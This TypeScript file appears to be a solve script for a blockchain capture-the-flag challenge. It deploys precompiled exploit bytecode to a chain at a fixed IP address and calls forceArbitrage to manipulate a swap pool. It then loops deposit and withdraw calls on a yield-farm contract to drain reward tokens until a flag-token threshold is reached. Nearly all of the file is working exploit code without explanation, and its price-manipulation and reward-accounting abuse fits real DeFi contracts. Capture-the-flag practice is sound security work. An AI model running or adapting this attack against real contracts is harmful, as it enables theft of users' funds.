import { BigNumber, ethers } from "ethers"
import { NonceManager } from "@ethersproject/experimental"
import N1FarmAbi from "./abi/N1FarmAbi.json"
import FlagTokenAbi from "./abi/FlagTokenAbi.json"
import N1TokenAbi from "./abi/N1TokenAbi.json"
import ExploitAbi from "./abi/ExploitAbi.json"
import DeployAbi from "./abi/DeployAbi.json"

let myAddress = "0x0D2871cc404305ca4F141bA90cea3e8649b9B9fE";
let privatekey = "";

let provider = new ethers.providers.JsonRpcProvider("http://101.42.119.132:8545");
let signer = new NonceManager(new ethers.Wallet(privatekey, provider));

let Deploy = "0xB99B60B71E23B0fd066215e6E07fCDB1Fc3d0857"
let N1Token = "0xedCdB0d6377bc484452A26E39CA9fcB3d57faA68"
let FlagToken = "0xd46beffbA9F12d87295D42bB532429482F2bAEa2"
let Pool = "0xb221898738D1925E73b0cdDF440aA1d44d5B7092"
let N1Farm = "0x31adD2Ae6e9EF0c9F41c478916A8Ac2234A5E4FA"

var stnonce = 102; // check your nonce

// chainId : const { chainId } = await provider.getNetwork() 

let N1TokenContract = new ethers.Contract(N1Token, N1TokenAbi, signer);
let FlagTokenContract = new ethers.Contract(FlagToken, FlagTokenAbi, signer);
let N1FarmContract = new ethers.Contract(N1Farm, N1FarmAbi, signer);
let N1TokenInterface = new ethers.utils.Interface(N1TokenAbi);
let N1FarmInterface = new ethers.utils.Interface(N1FarmAbi);
let ExploitInterface = new ethers.utils.Interface(ExploitAbi);
let DeployInterface = new ethers.utils.Interface(DeployAbi);

let bytecode = "0x61012060405273e93df93555f19c5b2b0410d38c815110e236c80c73ffffffffffffffffffffffffffffffffffffffff1660809073ffffffffffffffffffffffffffffffffffffffff1660601b81525073b221898738d1925e73b0cddf440aa1d44d5b709273ffffffffffffffffffffffffffffffffffffffff1660a09073ffffffffffffffffffffffffffffffffffffffff1660601b81525073edcdb0d6377bc484452a26e39ca9fcb3d57faa6873ffffffffffffffffffffffffffffffffffffffff1660c09073ffffffffffffffffffffffffffffffffffffffff1660601b81525073d46beffba9f12d87295d42bb532429482f2baea273ffffffffffffffffffffffffffffffffffffffff1660e09073ffffffffffffffffffffffffffffffffffffffff1660601b8152507331add2ae6e9ef0c9f41c478916a8ac2234a5e4fa73ffffffffffffffffffffffffffffffffffffffff166101009073ffffffffffffffffffffffffffffffffffffffff1660601b81525034801561018457600080fd5b5060805160601c60a05160601c60c05160601c60e05160601c6101005160601c610e096102056000398061044b5250806104cd52806106715250806102985280610824528061091352806109d75250806101bb52806102d45280610385528061059452806106ad528061075e5250806108605280610ac75250610e096000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c8063054d50d4146100465780632736a4591461009c578063845ffab11461015f575b600080fd5b6100866004803603606081101561005c57600080fd5b81019080803590602001909291908035906020019092919080359060200190929190505050610169565b6040518082815260200191505060405180910390f35b61015d600480360360808110156100b257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291908035906020019064010000000081111561011957600080fd5b82018360208201111561012b57600080fd5b8035906020019184600183028401116401000000008311171561014d57600080fd5b90919293919293905050506101b6565b005b610167610ac5565b005b60008061017f8386610b9490919063ffffffff16565b905060006101968686610c1a90919063ffffffff16565b90506101ab8183610ca290919063ffffffff16565b925050509392505050565b6000807f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b8152600401604080518083038186803b15801561021e57600080fd5b505afa158015610232573d6000803e3d6000fd5b505050506040513d604081101561024857600080fd5b81019080805190602001909291908051906020019092919050505091509150600061029486846dffffffffffffffffffffffffffff16846dffffffffffffffffffffffffffff16610169565b90507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663a9059cbb7f0000000000000000000000000000000000000000000000000000000000000000886040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b15801561034757600080fd5b505af115801561035b573d6000803e3d6000fd5b505050506040513d602081101561037157600080fd5b8101908080519060200190929190505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663022c0d9f600083306040518463ffffffff1660e01b8152600401808481526020018381526020018273ffffffffffffffffffffffffffffffffffffffff16815260200180602001828103825260008152602001602001945050505050600060405180830381600087803b15801561043157600080fd5b505af1158015610445573d6000803e3d6000fd5b505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166351e38f5a6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156104b157600080fd5b505af11580156104c5573d6000803e3d6000fd5b5050505060007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b15801561055257600080fd5b505afa158015610566573d6000803e3d6000fd5b505050506040513d602081101561057c57600080fd5b810190808051906020019092919050505090506000807f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b8152600401604080518083038186803b1580156105f757600080fd5b505afa15801561060b573d6000803e3d6000fd5b505050506040513d604081101561062157600080fd5b81019080805190602001909291908051906020019092919050505091509150600061066d84836dffffffffffffffffffffffffffff16856dffffffffffffffffffffffffffff16610169565b90507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663a9059cbb7f0000000000000000000000000000000000000000000000000000000000000000866040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b15801561072057600080fd5b505af1158015610734573d6000803e3d6000fd5b505050506040513d602081101561074a57600080fd5b8101908080519060200190929190505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663022c0d9f826000306040518463ffffffff1660e01b8152600401808481526020018381526020018273ffffffffffffffffffffffffffffffffffffffff16815260200180602001828103825260008152602001602001945050505050600060405180830381600087803b15801561080a57600080fd5b505af115801561081e573d6000803e3d6000fd5b505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663a9059cbb7f00000000000000000000000000000000000000000000000000000000000000008c6040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b1580156108d357600080fd5b505af11580156108e7573d6000803e3d6000fd5b505050506040513d60208110156108fd57600080fd5b81019080805190602001909291905050505060007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b15801561099857600080fd5b505afa1580156109ac573d6000803e3d6000fd5b505050506040513d60208110156109c257600080fd5b810190808051906020019092919050505090507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663a9059cbb730d2871cc404305ca4f141ba90cea3e8649b9b9fe836040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b158015610a7a57600080fd5b505af1158015610a8e573d6000803e3d6000fd5b505050506040513d6020811015610aa457600080fd5b81019080805190602001909291905050505050505050505050505050505050565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663e04b9d3a68d8d726b7177a8000006040518263ffffffff1660e01b81526004018082815260200180602001828103825260018152602001807f310000000000000000000000000000000000000000000000000000000000000081525060200192505050600060405180830381600087803b158015610b7a57600080fd5b505af1158015610b8e573d6000803e3d6000fd5b50505050565b600080831415610ba75760009050610c14565b6000828402905082848281610bb857fe5b0414610c0f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526021815260200180610db36021913960400191505060405180910390fd5b809150505b92915050565b600080828401905083811015610c98576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b6000610ce483836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250610cec565b905092915050565b60008083118290610d98576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610d5d578082015181840152602081019050610d42565b50505050905090810190601f168015610d8a5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b506000838581610da457fe5b04905080915050939250505056fe536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f77a2646970667358221220e9fda472633ef566920341dda1c0bdcbc7cd7245852f3424c397c98fb29410f064736f6c634300060c0033";

function delay(ms: number) {
    return new Promise( resolve => setTimeout(resolve, ms) );
}

async function deployContract() {
    console.log("deploying contract");
    let signed = await signer.signTransaction({
        from : myAddress,
        gasLimit : BigNumber.from(4000000),
        data : bytecode, 
        nonce : stnonce,
        chainId : 1211,
    })
    stnonce += 1;
    console.log("stnonce : " + stnonce.toString());
    let txhash = await provider.send("eth_sendRawTransaction", [signed]);
    console.log(txhash);
    await delay(20000);
    let res = await provider.send("eth_getTransactionReceipt", [txhash]);
    return res.contractAddress;
}

async function forceArbitrage(Exploit : string) {
    var calldata = ExploitInterface.encodeFunctionData("forceArbitrage");
    console.log("running exploit");
    let signed = await signer.signTransaction({
        from : myAddress,
        to : Exploit,
        gasLimit: BigNumber.from(4000000),
        nonce : stnonce,
        data : calldata, 
        chainId: 1211,
    });
    stnonce += 1;
    console.log("stnonce : " + stnonce.toString());
    await provider.send("eth_sendRawTransaction", [signed]);
    await delay(20000);
}

async function deposit(amount : BigNumber) {
    var calldata = N1FarmInterface.encodeFunctionData("deposit", [N1Token, amount]);
    console.log("sending deposit transaction");
    let signed = await signer.signTransaction({
        from : myAddress,
        to : N1Farm,
        gasLimit: BigNumber.from(2000000),
        nonce : stnonce,
        data : calldata, 
        chainId: 1211,
    });
    stnonce += 1;
    console.log("stnonce : " + stnonce.toString());
    await provider.send("eth_sendRawTransaction", [signed]);
    await delay(20000);
}

async function withdraw(amount : BigNumber) {
    var calldata = N1FarmInterface.encodeFunctionData("withdraw", [N1Token, amount]);
    console.log("sending withdraw transaction");
    let signed = await signer.signTransaction({
        from : myAddress,
        to : N1Farm,
        gasLimit: BigNumber.from(2000000),
        nonce : stnonce,
        data : calldata, 
        chainId: 1211,
    });
    stnonce += 1;
    console.log("stnonce : " + stnonce.toString());
    await provider.send("eth_sendRawTransaction", [signed]);
    await delay(20000);
}

async function approve() {
    var calldata = N1TokenInterface.encodeFunctionData("approve", [N1Farm, BigNumber.from(2).pow(256).sub(1)]);
    console.log("approving N1Token to N1Farm");
    let signed = await signer.signTransaction({
        from : myAddress,
        to : N1Token,
        gasLimit: BigNumber.from(2000000),
        nonce : stnonce,
        data : calldata, 
        chainId: 1211,
    });
    stnonce += 1;
    console.log("stnonce : " + stnonce.toString());
    await provider.send("eth_sendRawTransaction", [signed]);
    await delay(20000);
}

async function checkSolved() {
    var calldata = DeployInterface.encodeFunctionData("isSolved");
    console.log("checking solved");
    let signed = await signer.signTransaction({
        from : myAddress,
        to : Deploy,
        gasLimit: BigNumber.from(2000000),
        nonce : stnonce,
        data : calldata, 
        chainId: 1211,
    });
    stnonce += 1;
    console.log("stnonce : " + stnonce.toString());
    let txhash = await provider.send("eth_sendRawTransaction", [signed]);
    console.log("Final TxHash");
    console.log(txhash);
}

async function main() {
    console.log(await provider.getBalance(myAddress));

    let ExploitAddress = await deployContract();
    await forceArbitrage(ExploitAddress);

    let cur : BigNumber = await N1TokenContract.balanceOf(myAddress);
    console.log(cur.toBigInt());
    
    await approve();

    while(true) {
        await deposit(cur);
        await withdraw(cur.sub(1));
        await deposit(cur.sub(1));
        await withdraw(cur);
        
        console.log("myAddress");
        console.log((await N1TokenContract.balanceOf(myAddress)).toBigInt());
        console.log((await FlagTokenContract.balanceOf(myAddress)).toBigInt());

        console.log("SimpleSwap Pools");
        console.log((await N1TokenContract.balanceOf(Pool)).toBigInt());
        console.log((await FlagTokenContract.balanceOf(Pool)).toBigInt());

        console.log("poolInfo");
        console.log(await N1FarmContract.poolInfos(N1Token));

        console.log("N1Farm");
        console.log((await N1TokenContract.balanceOf(N1Farm)).toBigInt());
        console.log((await FlagTokenContract.balanceOf(N1Farm)).toBigInt());

        let flagbalance : BigNumber = await FlagTokenContract.balanceOf(myAddress);
        if(flagbalance.gt(BigNumber.from(200000).mul(BigNumber.from(10).pow(18)))) {
            break;
        }
    }
    
    await deposit(cur);
    await checkSolved();
}


main()